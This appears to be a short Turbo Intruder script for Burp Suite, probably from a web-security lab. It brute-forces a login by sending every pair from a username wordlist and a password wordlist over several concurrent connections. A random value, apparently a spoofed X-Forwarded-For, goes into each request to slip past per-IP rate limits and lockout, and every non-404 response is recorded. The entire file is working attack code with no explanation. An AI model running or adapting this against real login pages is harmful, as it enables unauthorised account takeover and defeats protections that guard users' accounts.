from random import randint


def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    for secondWord in open('/home/kali/Desktop/usr.txt'):
       for thirdWord in open('/home/kali/Desktop/pass.txt'):
                XFOR = randint(500,10500)
                engine.queue(target.req, [ XFOR, secondWord.rstrip(), thirdWord.rstrip()])


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
